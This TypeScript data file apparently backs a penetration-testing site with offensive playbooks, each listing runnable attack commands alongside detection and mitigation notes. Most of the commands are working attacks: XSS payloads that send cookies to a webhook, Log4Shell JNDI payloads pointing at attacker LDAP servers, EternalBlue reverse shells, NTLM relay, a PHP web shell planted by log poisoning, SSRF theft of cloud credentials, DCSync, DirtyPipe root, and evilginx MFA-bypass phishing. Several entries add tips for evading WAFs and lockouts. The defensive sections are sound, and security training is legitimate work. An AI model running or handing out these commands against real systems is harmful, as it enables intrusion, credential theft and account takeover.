import type { KnownError } from "./types";

export type PlaybookCategory =
  | "Web"
  | "Network"
  | "Active Directory"
  | "Wireless"
  | "Password"
  | "Privilege Escalation"
  | "Post-Exploitation"
  | "Social";

export type PlaybookStep = {
  title: string;
  detail: string;
  commands: { code: string; note: string }[];
};

export type Playbook = {
  slug: string;
  title: string;
  category: PlaybookCategory;
  severity: "low" | "medium" | "high" | "critical";
  cve?: string[];
  mitreAttack?: string[];
  summary: string;
  prerequisites: string[];
  toolSlugs: string[]; // link into /kali/$slug
  legalNote: string;
  steps: PlaybookStep[];
  errors: KnownError[];
  detection: string;
  mitigation: string;
};

const LEGAL =
  "Use only against systems you own or have explicit written authorization to test. Unauthorized use violates the CFAA (US), Computer Misuse Act (UK), and equivalent laws worldwide.";

export const PLAYBOOKS: Playbook[] = [
  {
    slug: "sqli-sqlmap",
    title: "SQL Injection with sqlmap",
    category: "Web",
    severity: "critical",
    cve: ["CWE-89"],
    mitreAttack: ["T1190"],
    summary:
      "Detect and exploit SQL injection in a vulnerable web parameter, dump the database, and (where possible) achieve RCE via the DB engine.",
    prerequisites: [
      "A candidate injectable URL or POST parameter",
      "Burp or curl to capture a raw request",
    ],
    toolSlugs: ["sqlmap", "burpsuite", "sqlmap-alias"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Capture a raw request",
        detail:
          "Proxy the vulnerable request through Burp and save it to a file — sqlmap can replay everything (cookies, headers, method).",
        commands: [
          {
            code: "# In Burp → Proxy → HTTP history → right-click → Copy to file → req.txt",
            note: "Use the raw file with -r.",
          },
        ],
      },
      {
        title: "Test the parameter",
        detail: "Let sqlmap fingerprint the DB and confirm injection.",
        commands: [
          {
            code: "sqlmap -r req.txt --batch --level=3 --risk=2",
            note: "Non-interactive, moderate depth.",
          },
        ],
      },
      {
        title: "Enumerate databases",
        detail: "List reachable databases.",
        commands: [{ code: "sqlmap -r req.txt --dbs", note: "" }],
      },
      {
        title: "Enumerate tables and columns",
        detail: "Narrow to interesting DBs.",
        commands: [
          { code: "sqlmap -r req.txt -D app --tables", note: "" },
          { code: "sqlmap -r req.txt -D app -T users --columns", note: "" },
        ],
      },
      {
        title: "Dump data",
        detail: "Extract rows for proof of impact.",
        commands: [
          {
            code: "sqlmap -r req.txt -D app -T users --dump",
            note: "Writes CSV under ~/.local/share/sqlmap/output/.",
          },
        ],
      },
      {
        title: "Escalate to RCE (where supported)",
        detail: "MySQL with FILE priv, MSSQL with xp_cmdshell, or PostgreSQL with COPY … PROGRAM.",
        commands: [
          {
            code: "sqlmap -r req.txt --os-shell",
            note: "Interactive OS shell when the DB engine permits.",
          },
        ],
      },
    ],
    errors: [
      {
        message: "all tested parameters do not appear to be injectable",
        cause: "Depth/risk too low, or WAF is stripping payloads.",
        fix: "Retry with --level=5 --risk=3, add --tamper=space2comment,between, or route through a residential IP.",
      },
      {
        message: "unable to connect to the target URL",
        cause: "Cookies expired or URL requires auth.",
        fix: "Recapture the request when logged in, or add --cookie/--auth-type.",
      },
    ],
    detection:
      "WAF alerts on classic payloads ('1=1', UNION SELECT), spikes in 500/200 responses for the same URL with tiny variations, DB slow-query logs with UNION or SLEEP.",
    mitigation:
      "Parameterised queries (prepared statements) at every DB boundary. ORMs correctly used. No dynamic SQL string concatenation. Least-privilege DB users so a successful injection can't dump other schemas.",
  },
  {
    slug: "xss-reflected",
    title: "Reflected & Stored XSS",
    category: "Web",
    severity: "high",
    cve: ["CWE-79"],
    mitreAttack: ["T1059.007"],
    summary:
      "Find where user input is reflected without escaping, deliver JavaScript that fires in a victim's browser session, and steal cookies or hijack actions.",
    prerequisites: [
      "Any input field or URL parameter that echoes back in HTML/JS/attribute context",
    ],
    toolSlugs: ["dalfox", "xsser", "burpsuite", "zaproxy"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Find reflection points",
        detail: "Crawl and mark parameters whose value appears in the response body.",
        commands: [
          {
            code: "dalfox url 'https://target.tld/search?q=hello'",
            note: "Automated reflection + payload testing.",
          },
        ],
      },
      {
        title: "Confirm execution context",
        detail:
          "Is the reflection in HTML text, an attribute, or a <script> block? Each needs a different payload.",
        commands: [
          {
            code: "curl -s 'https://target.tld/search?q=<xss>' | grep -n '<xss>'",
            note: "See where it lands.",
          },
        ],
      },
      {
        title: "Bypass filters",
        detail: "Try event handlers, SVG, unicode escapes, and case variation for lazy blocklists.",
        commands: [
          {
            code: "dalfox url 'https://target.tld/search?q=X' --custom-payload payloads.txt",
            note: "",
          },
        ],
      },
      {
        title: "Weaponise",
        detail: "Load an attacker JS that exfils document.cookie to a webhook you control.",
        commands: [
          {
            code: '<script src="https://webhook.site/xxxx/x.js"></script>',
            note: "Simple exfil via <script>.",
          },
          { code: "fetch('https://webhook.site/xxxx?c='+document.cookie)", note: "Inline exfil." },
        ],
      },
    ],
    errors: [
      {
        message: "payload reflected but does not execute",
        cause: "CSP blocks inline JS, or the reflection is HTML-encoded.",
        fix: "Check the Content-Security-Policy header; try attribute-based (onerror=) or bypasses aligned to allowed script-src.",
      },
    ],
    detection:
      "CSP violation reports, WAF pattern matches on <script/onerror/javascript:, users reporting unexpected redirects.",
    mitigation:
      "Context-aware output encoding (HTML, attribute, JS, URL), strict CSP with nonces, HttpOnly + SameSite cookies, Trusted Types.",
  },
  {
    slug: "log4shell",
    title: "Log4Shell (CVE-2021-44228)",
    category: "Web",
    severity: "critical",
    cve: ["CVE-2021-44228"],
    mitreAttack: ["T1190", "T1203"],
    summary:
      "Exploit unpatched Log4j versions that perform JNDI lookups on logged strings, causing the server to load and execute a remote Java class.",
    prerequisites: [
      "An input field, header, or URL parameter whose value gets logged by the target",
      "A publicly-reachable listener (interactsh, LDAP server)",
    ],
    toolSlugs: ["burpsuite", "nuclei", "metasploit"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Set up an OOB canary",
        detail: "Use interactsh (or a self-hosted DNS log) to detect callback.",
        commands: [{ code: "interactsh-client", note: "Note the generated subdomain." }],
      },
      {
        title: "Probe headers and params",
        detail: "Send the JNDI payload in every header and query parameter that might be logged.",
        commands: [
          {
            code: "curl -H 'User-Agent: ${jndi:ldap://<oob>.oast.pro/x}' https://target.tld/",
            note: "",
          },
          { code: "curl 'https://target.tld/?x=${jndi:ldap://<oob>.oast.pro/x}'", note: "" },
        ],
      },
      {
        title: "If callback fires, host malicious class",
        detail: "Stand up an LDAP referral to a HTTP-served .class that runs Runtime.exec.",
        commands: [
          {
            code: "git clone https://github.com/mbechler/marshalsec && cd marshalsec && mvn package -DskipTests",
            note: "Build the LDAP referral server.",
          },
          {
            code: "java -cp target/marshalsec-*-all.jar marshalsec.jndi.LDAPRefServer 'http://<attacker>:8000/#Exploit'",
            note: "",
          },
        ],
      },
      {
        title: "Serve the payload class",
        detail: "Simple Python HTTP server hosting the compiled .class.",
        commands: [
          { code: "python3 -m http.server 8000", note: "In directory with Exploit.class." },
        ],
      },
    ],
    errors: [
      {
        message: "callback never fires",
        cause: "Target is patched (>=2.17), input isn't logged, or egress is blocked.",
        fix: "Try lookup bypasses (${${lower:j}ndi:...}), rotate insertion points, or confirm outbound DNS is allowed.",
      },
    ],
    detection:
      "IDS rules for JNDI/${jndi patterns, Java process making outbound LDAP/HTTP to unusual hosts, log entries containing raw JNDI URIs.",
    mitigation:
      "Upgrade log4j to ≥2.17.1, set log4j2.formatMsgNoLookups=true, remove JndiLookup.class, restrict egress from application servers.",
  },
  {
    slug: "smb-eternalblue",
    title: "EternalBlue (MS17-010)",
    category: "Network",
    severity: "critical",
    cve: ["CVE-2017-0144"],
    mitreAttack: ["T1210"],
    summary:
      "Exploit the SMBv1 vulnerability in unpatched Windows 7 / Server 2008 R2 for reliable SYSTEM RCE.",
    prerequisites: [
      "TCP 445 reachable",
      "Target vulnerable and unpatched (very common in isolated legacy environments)",
    ],
    toolSlugs: ["nmap", "metasploit"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Confirm vulnerability with nmap",
        detail: "The smb-vuln-ms17-010 NSE script is definitive.",
        commands: [{ code: "nmap -p445 --script smb-vuln-ms17-010 10.0.0.5", note: "" }],
      },
      {
        title: "Load Metasploit module",
        detail: "",
        commands: [
          { code: "msfconsole -q\nuse exploit/windows/smb/ms17_010_eternalblue", note: "" },
        ],
      },
      {
        title: "Configure and fire",
        detail: "",
        commands: [
          {
            code: "set RHOSTS 10.0.0.5\nset LHOST tun0\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nrun",
            note: "",
          },
        ],
      },
    ],
    errors: [
      {
        message:
          "Exploit aborted due to failure: no-target: This target is not a vulnerable Windows version",
        cause: "Newer/patched target, or non-x64 payload against x64 target.",
        fix: "Verify with nmap script; try the auxiliary check module first; match arch.",
      },
    ],
    detection:
      "SMB traffic to :445 from unusual sources, ETERNALBLUE signatures in every commercial IDS, event 4625 spikes.",
    mitigation:
      "Disable SMBv1 (Set-SmbServerConfiguration -EnableSMB1Protocol $false), apply MS17-010, segment legacy hosts off the corporate LAN.",
  },
  {
    slug: "kerberoast",
    title: "Kerberoasting",
    category: "Active Directory",
    severity: "high",
    mitreAttack: ["T1558.003"],
    summary:
      "Request TGS tickets for service accounts with SPNs, extract the encrypted portion, and crack offline to recover the service account password.",
    prerequisites: [
      "Any valid domain user credentials (even low-priv)",
      "Line-of-sight to a Domain Controller on 88/tcp",
    ],
    toolSlugs: ["impacket", "hashcat", "john", "cme-alias"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Enumerate SPNs",
        detail: "Find accounts with a Service Principal Name — anything with an SPN is roastable.",
        commands: [
          {
            code: "impacket-GetUserSPNs -request corp.local/alice:'Password1' -dc-ip 10.0.0.10 -outputfile spns.hash",
            note: "Writes hashcat-format hashes.",
          },
        ],
      },
      {
        title: "Crack offline",
        detail: "Hashcat mode 13100 is Kerberos 5 TGS-REP etype 23.",
        commands: [
          {
            code: "hashcat -m 13100 -a 0 spns.hash /usr/share/wordlists/rockyou.txt -r rules/best64.rule",
            note: "",
          },
        ],
      },
      {
        title: "Use the cracked credential",
        detail: "Log in with the service account (usually has strong local privileges).",
        commands: [
          { code: "nxc smb 10.0.0.0/24 -u svc_sql -p 'Cracked!' --shares", note: "netexec spray." },
        ],
      },
    ],
    errors: [
      {
        message: "KRB_AP_ERR_SKEW",
        cause: "Client and DC clocks differ by >5 minutes.",
        fix: "sudo ntpdate <DC-IP>, or set your box's TZ/clock.",
      },
      {
        message: "No SPNs returned",
        cause: "Environment has no service accounts, or your user can't query LDAP.",
        fix: "Try a different user; confirm LDAP reachability with ldapsearch.",
      },
    ],
    detection:
      "Event 4769 for many services from one user in a short window, anomalous TGS requests for RC4 etypes.",
    mitigation:
      "Managed Service Accounts (MSA/gMSA), long random passwords on service accounts, disable RC4 for Kerberos, monitor event 4769.",
  },
  {
    slug: "ntlm-relay",
    title: "NTLM Relay (Responder + ntlmrelayx)",
    category: "Active Directory",
    severity: "critical",
    mitreAttack: ["T1557.001", "T1187"],
    summary:
      "Poison LLMNR/NBT-NS/MDNS to capture NTLM authentication, then relay it to another target (often a DC or file server) that does not enforce SMB signing.",
    prerequisites: [
      "On the same broadcast domain as victims",
      "At least one target with SMB signing disabled/not required",
    ],
    toolSlugs: ["responder", "impacket", "cme-alias"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Find relay targets",
        detail: "SMB signing not required = relay target.",
        commands: [
          {
            code: "nxc smb 10.0.0.0/24 --gen-relay-list relay-targets.txt",
            note: "Writes targets to file.",
          },
        ],
      },
      {
        title: "Poison + relay",
        detail: "Disable Responder's SMB/HTTP servers so ntlmrelayx can bind them.",
        commands: [
          { code: "sudo responder -I eth0 -w -d --lm -A", note: "" },
          {
            code: "sudo impacket-ntlmrelayx -tf relay-targets.txt -smb2support -c 'powershell -enc BASE64'",
            note: "Runs command as the relayed user on any target.",
          },
        ],
      },
      {
        title: "Dump SAM or add local admin",
        detail: "Default action if you don't supply -c is SAM dump.",
        commands: [
          { code: "sudo impacket-ntlmrelayx -tf relay-targets.txt -smb2support", note: "" },
        ],
      },
    ],
    errors: [
      {
        message: "Address already in use (port 445)",
        cause: "Local Samba is bound to 445.",
        fix: "sudo systemctl stop smbd nmbd",
      },
      {
        message: "STATUS_LOGON_FAILURE relayed",
        cause: "Signed but not the domain controller / credential invalid.",
        fix: "Re-check relay list; ensure SMB signing not required on the specific target.",
      },
    ],
    detection:
      "Sudden burst of LLMNR/NBT-NS queries with unusual responders, event 4624 logons from unusual sources, network segmentation alerts.",
    mitigation:
      "Disable LLMNR + NBT-NS via GPO, require SMB signing on every SMB server, enable Extended Protection for Authentication (EPA), enforce channel binding.",
  },
  {
    slug: "wpa2-handshake",
    title: "WPA/WPA2 handshake capture + crack",
    category: "Wireless",
    severity: "high",
    mitreAttack: ["T1040"],
    summary:
      "Sniff the 4-way handshake from a target Wi-Fi network (optionally forcing it via deauth), then crack the PSK offline with hashcat.",
    prerequisites: [
      "Wi-Fi adapter that supports monitor mode + packet injection",
      "Line-of-sight to the target AP with an associated client",
    ],
    toolSlugs: ["aircrack-ng", "hcxtools", "hashcat", "wifite"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Enable monitor mode",
        detail: "",
        commands: [
          {
            code: "sudo airmon-ng check kill\nsudo airmon-ng start wlan0",
            note: "kill NetworkManager & wpa_supplicant first.",
          },
        ],
      },
      {
        title: "Locate the target AP",
        detail: "Note the BSSID and channel.",
        commands: [
          { code: "sudo airodump-ng wlan0mon", note: "Ctrl-C once you have BSSID + channel." },
        ],
      },
      {
        title: "Capture on the target channel",
        detail: "Lock to one channel and wait for a handshake.",
        commands: [
          { code: "sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon", note: "" },
        ],
      },
      {
        title: "Force a handshake (optional)",
        detail: "Deauth an associated client so it reconnects.",
        commands: [
          {
            code: "sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon",
            note: "5 deauths. Look for 'WPA handshake:' in airodump.",
          },
        ],
      },
      {
        title: "Convert and crack",
        detail: "hcxpcapngtool converts to hashcat 22000 format.",
        commands: [
          { code: "hcxpcapngtool -o handshake.22000 capture-01.cap", note: "" },
          { code: "hashcat -m 22000 handshake.22000 /usr/share/wordlists/rockyou.txt", note: "" },
        ],
      },
    ],
    errors: [
      {
        message: "no handshake captured after waiting",
        cause: "No clients on AP, or deauth not reaching them.",
        fix: "Get physically closer, try the PMKID attack instead (hcxdumptool -o dump.pcapng --enable_status=1 -i wlan0mon).",
      },
      {
        message: "hcxpcapngtool: 0 handshakes written",
        cause: "Captured .cap didn't contain both EAPOL messages 1+2 or 2+3.",
        fix: "Recapture longer, or filter for the client MAC too.",
      },
    ],
    detection:
      "Rogue AP detection, IDS alerts on excessive deauth frames, WIDS with anomaly detection.",
    mitigation:
      "WPA3-SAE (kills offline dictionary attack), Protected Management Frames (PMF) to defeat deauth, long random PSKs (>20 chars).",
  },
  {
    slug: "ssh-brute",
    title: "SSH credential brute-force with hydra",
    category: "Password",
    severity: "medium",
    mitreAttack: ["T1110.001"],
    summary:
      "Spray usernames and passwords against an exposed SSH service. Effective on services with weak credentials, common on IoT and legacy admin interfaces.",
    prerequisites: [
      "Reachable TCP/22 (or whatever port SSH is on)",
      "A username list and a password wordlist",
    ],
    toolSlugs: ["hydra", "medusa", "ncrack"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Confirm SSH is up",
        detail: "",
        commands: [{ code: "nmap -p22 -sV 10.0.0.5", note: "" }],
      },
      {
        title: "Spray a known user",
        detail: "Slow rate to avoid fail2ban / lockout.",
        commands: [
          {
            code: "hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://10.0.0.5",
            note: "-f exits on first success, -t 4 is 4 tasks.",
          },
        ],
      },
      {
        title: "Spray user + pass lists",
        detail: "",
        commands: [
          { code: "hydra -L users.txt -P passwords.txt -t 4 -f ssh://10.0.0.5", note: "" },
        ],
      },
    ],
    errors: [
      {
        message:
          "[ERROR] target ssh://10.0.0.5:22/ - kex_exchange_identification: Connection closed",
        cause:
          "fail2ban banned your IP, or SSH server dropped due to too many parallel connections.",
        fix: "Lower -t to 1 or 2, add -W 30 wait, or wait out the ban.",
      },
      {
        message: "All attempts failed - 0 valid pairs",
        cause: "Server requires key auth (PasswordAuthentication no).",
        fix: "Confirm with ssh -v; if key-only, brute force won't help — pivot to key discovery.",
      },
    ],
    detection:
      "fail2ban/CrowdSec bans, spike of sshd auth failures in /var/log/auth.log, MFA push storms.",
    mitigation:
      "Disable password auth (keys only), enforce MFA, run SSH on a non-default port + fail2ban, use TCP wrappers or geo-blocking.",
  },
  {
    slug: "hashcat-workflow",
    title: "Hashcat cracking workflow",
    category: "Password",
    severity: "high",
    summary:
      "Identify a hash, choose the right mode, and crack it with wordlists, rules, and masks.",
    prerequisites: ["A captured hash (from a dump, capture, or file)", "GPU strongly recommended"],
    toolSlugs: ["hashcat", "john", "hash-identifier"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Identify the hash",
        detail: "Use hash-identifier or hashcat's example hashes doc.",
        commands: [
          { code: "hash-identifier", note: "Paste hash." },
          { code: "hashcat --example-hashes | less", note: "Match format to mode number." },
        ],
      },
      {
        title: "Straight wordlist attack",
        detail: "",
        commands: [
          { code: "hashcat -m <mode> -a 0 hashes.txt /usr/share/wordlists/rockyou.txt", note: "" },
        ],
      },
      {
        title: "Rules attack for variants",
        detail: "",
        commands: [
          {
            code: "hashcat -m <mode> -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
            note: "",
          },
        ],
      },
      {
        title: "Mask attack for known structure",
        detail: "",
        commands: [
          {
            code: "hashcat -m <mode> -a 3 hashes.txt ?u?l?l?l?l?d?d?d?d",
            note: "Uppercase + 4 lower + 4 digits.",
          },
        ],
      },
      {
        title: "Combo of dict + mask",
        detail: "",
        commands: [
          {
            code: "hashcat -m <mode> -a 6 hashes.txt rockyou.txt ?d?d?d?d",
            note: "Word + 4 digits.",
          },
        ],
      },
    ],
    errors: [
      {
        message: "Not enough allocatable device memory",
        cause: "GPU VRAM too small for the workload.",
        fix: "Add -w 1 (lowest workload), or split the wordlist.",
      },
      {
        message: "No hashes loaded",
        cause: "Wrong mode, or hashes file has stray whitespace/BOM.",
        fix: "dos2unix hashes.txt; sanity-check with --example-hashes -m <mode>.",
      },
    ],
    detection: "N/A — offline attack.",
    mitigation:
      "Slow adaptive hashing (bcrypt/argon2/scrypt), per-user salt, and passphrases with >100 bits of entropy.",
  },
  {
    slug: "linux-privesc",
    title: "Linux privilege escalation",
    category: "Privilege Escalation",
    severity: "high",
    mitreAttack: ["T1548", "T1068"],
    summary:
      "Systematically enumerate a foothold for common privesc vectors: sudo misconfigs, SUID binaries, cron, capabilities, and kernel exploits.",
    prerequisites: ["Non-root shell on a Linux target"],
    toolSlugs: ["linpeas", "linenum", "unix-privesc-check"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Automated enum with LinPEAS",
        detail: "Yellow-highlighted items are the fast wins.",
        commands: [
          {
            code: "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            note: "Or copy binary and run locally.",
          },
        ],
      },
      {
        title: "Check sudo -l",
        detail: "Any NOPASSWD or GTFOBins entry is game over.",
        commands: [
          { code: "sudo -l", note: "Cross-reference results against gtfobins.github.io." },
        ],
      },
      {
        title: "SUID binaries",
        detail: "",
        commands: [{ code: "find / -perm -4000 -type f 2>/dev/null", note: "" }],
      },
      {
        title: "Capabilities",
        detail: "",
        commands: [
          { code: "getcap -r / 2>/dev/null", note: "cap_setuid+ep on python/perl = root." },
        ],
      },
      {
        title: "Writable cron/systemd",
        detail: "",
        commands: [{ code: "ls -la /etc/cron.* /etc/systemd/system/", note: "" }],
      },
      {
        title: "Kernel exploits (last resort)",
        detail: "DirtyPipe (CVE-2022-0847, kernels 5.8–5.16.10), PwnKit (CVE-2021-4034).",
        commands: [
          {
            code: "uname -r  # check kernel version",
            note: "Match version to a known CVE before running exploit.",
          },
        ],
      },
    ],
    errors: [
      {
        message: "linpeas.sh: /bin/sh: bad interpreter",
        cause: "Wrong line endings after transferring from Windows.",
        fix: "dos2unix linpeas.sh",
      },
    ],
    detection:
      "auditd rules on SUID/setcap/cron edits, EDR alerts on known privesc binaries running.",
    mitigation:
      "Least-privilege sudoers, monitor SUID + capabilities inventories, patch kernel promptly, mount /tmp noexec,nosuid.",
  },
  {
    slug: "dirtypipe",
    title: "DirtyPipe (CVE-2022-0847)",
    category: "Privilege Escalation",
    severity: "critical",
    cve: ["CVE-2022-0847"],
    mitreAttack: ["T1068"],
    summary:
      "Linux pipe buffer flag mishandling lets an unprivileged user overwrite arbitrary read-only files, including /etc/passwd — trivial local root on kernels 5.8 through 5.16.10 / 5.15.24 / 5.10.101.",
    prerequisites: ["Local shell", "Vulnerable kernel (verify with uname -r)"],
    toolSlugs: [],
    legalNote: LEGAL,
    steps: [
      {
        title: "Check kernel version",
        detail: "",
        commands: [
          {
            code: "uname -r",
            note: "Vulnerable if between 5.8 and the patched 5.15.24/5.16.11/5.10.102.",
          },
        ],
      },
      {
        title: "Compile the PoC",
        detail: "",
        commands: [
          {
            code: "git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits && cd CVE-2022-0847-DirtyPipe-Exploits\nmake",
            note: "",
          },
        ],
      },
      {
        title: "Overwrite /etc/passwd root hash",
        detail: "The PoC restores /etc/passwd after spawning root shell.",
        commands: [{ code: "./exploit-2", note: "Spawns root shell if vulnerable." }],
      },
    ],
    errors: [
      {
        message: "not vulnerable",
        cause: "Kernel patched.",
        fix: "Try a different privesc path (sudo/SUID/caps).",
      },
    ],
    detection:
      "auditd on /etc/passwd write, EDR on unexpected root shells spawned from user context.",
    mitigation: "Update kernel to 5.16.11 / 5.15.24 / 5.10.102 or later.",
  },
  {
    slug: "lfi-to-rce",
    title: "LFI to RCE via log poisoning",
    category: "Web",
    severity: "high",
    cve: ["CWE-98"],
    mitreAttack: ["T1190"],
    summary:
      "Read arbitrary files via a Local File Inclusion bug, then poison a log the server later includes as PHP to achieve code execution.",
    prerequisites: ["A parameter that includes files based on user input (?page=about.php)"],
    toolSlugs: ["burpsuite", "ffuf", "gobuster"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Confirm LFI",
        detail: "",
        commands: [
          {
            code: "curl 'https://target.tld/?page=../../../../etc/passwd'",
            note: "Should return /etc/passwd contents.",
          },
        ],
      },
      {
        title: "Fuzz for the working traversal depth",
        detail: "",
        commands: [
          {
            code: "ffuf -u 'https://target.tld/?page=FUZZ/etc/passwd' -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt",
            note: "",
          },
        ],
      },
      {
        title: "Poison Apache/Nginx access log",
        detail: "The User-Agent gets logged verbatim.",
        commands: [
          { code: "curl -A '<?php system($_GET[\"c\"]); ?>' https://target.tld/", note: "" },
          {
            code: "curl 'https://target.tld/?page=/var/log/apache2/access.log&c=id'",
            note: "Include the log; ?c=id runs id.",
          },
        ],
      },
    ],
    errors: [
      {
        message: "no traversal works",
        cause: "Filter or open_basedir restrictions.",
        fix: "Try PHP wrappers (php://filter/read=convert.base64-encode/resource=), null-byte on ancient PHP, or /proc/self/environ.",
      },
    ],
    detection:
      "WAF on ../, php:// or /proc paths in URLs; unusual reads of access.log by the web server user.",
    mitigation:
      "Never build file paths from user input; use a mapped allow-list of allowed views. Disable allow_url_include. Set open_basedir.",
  },
  {
    slug: "ssrf-cloud",
    title: "SSRF to cloud metadata credential theft",
    category: "Web",
    severity: "critical",
    mitreAttack: ["T1190", "T1552.005"],
    summary:
      "Coerce a server to fetch attacker-controlled URLs (SSRF) and pivot to the cloud instance metadata endpoint (IMDSv1) to steal IAM credentials.",
    prerequisites: [
      "A server-side URL fetch feature (webhook, image-proxy, PDF renderer)",
      "Target hosted on AWS/GCP/Azure without IMDSv2 enforcement",
    ],
    toolSlugs: ["burpsuite", "ffuf"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Find URL sinks",
        detail: "Webhooks, avatar-from-URL, share-preview.",
        commands: [
          { code: "# In Burp, look for params like url=, image=, callback=, next=", note: "" },
        ],
      },
      {
        title: "Confirm SSRF with an OOB canary",
        detail: "",
        commands: [
          { code: "# Point the sink at your Burp Collaborator / interactsh subdomain", note: "" },
        ],
      },
      {
        title: "Pivot to AWS IMDS",
        detail: "",
        commands: [
          {
            code: "curl 'https://target.tld/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
            note: "Role name.",
          },
          {
            code: "curl 'https://target.tld/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>'",
            note: "AccessKeyId + SecretAccessKey + Token.",
          },
        ],
      },
      {
        title: "Use the stolen creds",
        detail: "",
        commands: [
          {
            code: "AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws sts get-caller-identity",
            note: "",
          },
        ],
      },
    ],
    errors: [
      {
        message: "403 from 169.254.169.254",
        cause: "IMDSv2 required (needs PUT for token first).",
        fix: "SSRF that only allows GET can't reach IMDSv2 tokens — pivot elsewhere.",
      },
    ],
    detection:
      "Outbound HTTP from app servers to 169.254.169.254 or link-local metadata endpoints, CloudTrail STS calls from unusual IPs.",
    mitigation:
      "Enforce IMDSv2 (require PUT token), block outbound to 169.254.169.254 at the app-server firewall, deny internal ranges by default in URL-fetching code, use SSRF-proof HTTP clients.",
  },
  {
    slug: "mimikatz-dcsync",
    title: "DCSync with mimikatz / secretsdump",
    category: "Active Directory",
    severity: "critical",
    mitreAttack: ["T1003.006"],
    summary:
      "Abuse the Directory Replication Service (DRSUAPI) with an account that has the DS-Replication-Get-Changes rights to pull every password hash from the DC, without ever running code on it.",
    prerequisites: [
      "Compromised account with replication rights (Domain Admins, Enterprise Admins, or delegated)",
    ],
    toolSlugs: ["impacket", "mimikatz-wine", "cme-alias"],
    legalNote: LEGAL,
    steps: [
      {
        title: "From Linux (impacket)",
        detail: "",
        commands: [
          {
            code: "impacket-secretsdump -just-dc-user Administrator corp.local/da_user:'Pw'@10.0.0.10",
            note: "One user.",
          },
          {
            code: "impacket-secretsdump corp.local/da_user:'Pw'@10.0.0.10",
            note: "Everything (NTDS + SAM + LSA).",
          },
        ],
      },
      {
        title: "From Windows (mimikatz)",
        detail: "",
        commands: [
          { code: "mimikatz # lsadump::dcsync /user:krbtgt /domain:corp.local", note: "" },
        ],
      },
      {
        title: "Use hashes for Pass-the-Hash / Golden Ticket",
        detail: "",
        commands: [
          {
            code: "impacket-wmiexec -hashes :NTHASH corp.local/Administrator@10.0.0.5",
            note: "PtH.",
          },
        ],
      },
    ],
    errors: [
      {
        message: "DRSGetNCChanges returned ERROR_DS_DRA_ACCESS_DENIED",
        cause: "Account lacks replication rights.",
        fix: "Use a DA account or one with DS-Replication-Get-Changes-All delegated in AD.",
      },
    ],
    detection:
      "Event 4662 with DRSGetNCChanges GUID from a non-DC source, unusual replication traffic to a workstation.",
    mitigation:
      "Audit and prune replication rights, tier your admin accounts, alert on 4662 for DRSUAPI GUIDs from anything but DCs.",
  },
  {
    slug: "phishing-evilginx",
    title: "MFA-bypass phishing with evilginx2",
    category: "Social",
    severity: "critical",
    mitreAttack: ["T1566.002", "T1539"],
    summary:
      "Stand up a reverse-proxy phishlet that captures the victim's session cookie after MFA, bypassing TOTP and push-based 2FA.",
    prerequisites: [
      "Registered look-alike domain",
      "TLS cert (auto via Let's Encrypt)",
      "Written authorisation for the engagement",
    ],
    toolSlugs: ["evilginx2", "gophish"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Point DNS at your VPS",
        detail: "A + wildcard A record for the look-alike domain.",
        commands: [
          {
            code: "# A record: login.<lookalike>  →  <VPS_IP>\n# A record: *.<lookalike>      →  <VPS_IP>",
            note: "",
          },
        ],
      },
      {
        title: "Launch evilginx",
        detail: "",
        commands: [{ code: "sudo evilginx2 -p /usr/share/evilginx2/phishlets", note: "" }],
      },
      {
        title: "Configure phishlet and lure",
        detail: "",
        commands: [
          {
            code: "config domain <lookalike>\nconfig ip <VPS_IP>\nphishlets hostname o365 login.<lookalike>\nphishlets enable o365\nlures create o365\nlures get-url 0",
            note: "Returns weaponised URL.",
          },
        ],
      },
      {
        title: "Send + harvest sessions",
        detail: "",
        commands: [
          {
            code: "sessions",
            note: "Once a victim authenticates + completes MFA, cookies are captured here.",
          },
        ],
      },
    ],
    errors: [
      {
        message: "certificate acquisition failed",
        cause: "DNS records not propagated, or port 80/443 blocked at the VPS provider.",
        fix: "Verify with 'dig <lookalike>' from an external resolver and open :80/:443 in the cloud firewall.",
      },
    ],
    detection:
      "Newly-registered look-alike domains (dnstwist), unusual OAuth grants, sign-ins from unfamiliar ASN.",
    mitigation:
      "Phishing-resistant MFA (FIDO2/WebAuthn), conditional access with device-bound tokens, user reporting culture, DMARC/SPF/DKIM enforcement.",
  },
];

export const playbookBySlug = (slug: string) => PLAYBOOKS.find((p) => p.slug === slug);

export const PLAYBOOK_CATEGORIES: PlaybookCategory[] = [
  "Web",
  "Network",
  "Active Directory",
  "Wireless",
  "Password",
  "Privilege Escalation",
  "Post-Exploitation",
  "Social",
];
